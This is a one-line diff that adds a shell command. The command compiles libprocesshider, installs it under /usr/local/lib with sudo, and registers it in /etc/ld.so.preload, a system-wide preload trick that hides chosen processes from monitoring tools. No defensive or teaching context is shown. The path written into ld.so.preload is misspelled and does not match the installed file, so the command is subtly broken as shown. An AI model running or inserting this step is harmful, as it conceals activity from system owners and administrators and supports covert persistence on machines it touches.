@@ -1,0 +1,1 @@
+cd libprocesshider-master && make && sudo mv libprocesshider.so /usr/local/lib && echo /usr/local/lib/libprcoesshider.so >> /etc/ld.so.preload
